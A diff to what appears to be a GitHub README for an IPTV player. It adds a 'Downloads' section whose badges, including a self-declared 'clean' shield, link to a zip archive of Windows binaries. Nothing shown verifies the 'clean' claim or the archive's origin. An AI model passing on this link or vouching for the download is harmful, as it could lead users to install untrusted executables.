@@ -17,6 +17,11 @@ With SFVIP Player X 64 IPTV Player, you can delve into your favorite movies, TV 
 - Create smart playlists: Take advantage of SFVIP Player X 64 IPTV Player playlist management capabilities. Create smart playlists based on criteria such as genre, artist, or rating to automate the organization of your media library.
 - Enable automatic subtitles: If you frequently watch foreign films or videos with subtitles, enable automatic subtitle downloads within SFVIP Player X 64 IPTV Player. This feature automatically searches and downloads subtitles for your media files, saving you time and effort.
 
+# Downloads
+[<img src="https://custom-icon-badges.demolab.com/badge/Sfvip All v1.2.7.82-informational?logo=download-cloud&logoSource=feather&logoColor=white&style=flat-square" height="35"><img src="https://img.shields.io/badge/x64-informational?logo=Windows10&logoColor=lightblue&style=flat-square" height="35"><img src="https://custom-icon-badges.demolab.com/badge/clean-brightgreen?logo=shield-check&logoColor=white&style=flat-square" height="35">](https://github.com/austintools/SFVIP-Player/releases/download/1.2.7.82/SFVIP-Player-x64.zip)
+
+
+
 ## Requirements:
 - OS: Any x64 Windows system.
 
